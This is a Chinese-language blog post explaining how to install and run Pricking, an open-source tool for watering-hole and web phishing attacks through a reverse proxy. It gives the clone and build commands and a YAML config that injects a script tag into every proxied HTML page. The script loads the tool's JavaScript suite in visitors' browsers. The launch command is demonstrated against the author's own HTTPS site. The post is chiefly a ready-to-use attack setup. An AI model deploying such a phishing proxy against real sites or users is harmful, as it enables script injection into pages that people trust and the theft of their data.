---
date: "2021-12-24T00:37:56+08:00"
description: Pricking 是一个基于反向代理技术进行水坑攻击的项目，本文介绍Pricking项目的安装与使用。
title: 基于反向代理技术进行水坑攻击- Pricking项目使用介绍
url: /archivers/2021-02-18/1
---


## 0x00 安装项目

[Pricking](https://github.com/Rvn0xsy/Pricking) 是一个自动化部署水坑和网页钓鱼的开源项目，本文介绍[Pricking](https://github.com/Rvn0xsy/Pricking) 项目的安装与使用。

```
$ git clone https://github.com/Rvn0xsy/Pricking
$ cd Pricking
$ make
```

## 0x01 例子演示

环境：

- 反向代理服务器：MacOS 64Bit 192.168.117.1
- 目标域名：https://payloads.online

配置文件：

```yaml
filter_type:
  - "text/html" # 仅针对网页内容进行注入
exclude_file:   # 静态文件的数据包不进行注入
  - ".jpg"
  - ".css"
  - ".png"
  - ".js"
  - ".ico"
  - ".svg"
  - ".gif"
  - ".jpeg"
  - ".woff"
  - ".tff"
static_dir: "./static" # Pricking Suite 目录
pricking_prefix_url: "/pricking_static_files" # 静态目录名，不能与目标网站冲突
listen_address: "192.168.117.1:9999" # 监听地址:端口
inject_body: "<script src='/pricking_static_files/static.js' type='module'></script>" # 注入代码
```
Pricking是支持HTTPS反向代理的，我的博客刚好是HTTPS加密的，所以能把HTTPS转换为HTTP。

![](../../../static/images/2021-12-24-14-00-37.png)

启动Pricking，**确保配置文件、Static在当前目录**：

```bash
$ ./pricking -url https://payloads.online
2021/12/24 14:03:33 Loading config  ./config.yaml
```

![](../../../static/images/2021-12-24-14-10-18.png)

代理效果：

![](../../../static/images/2021-12-24-14-05-09.png)

查看页面底部：

![](../../../static/images/2021-12-24-14-06-25.png)

代码已经成功注入，[static.js](https://github.com/Rvn0xsy/Pricking/tree/main/static)中的代码就是用于引用[Pricking Js Suite](https://github.com/Rvn0xsy/Pricking/tree/main/static)的内容进行加载执行。

![](../../../static/images/2021-12-24-14-14-00.png)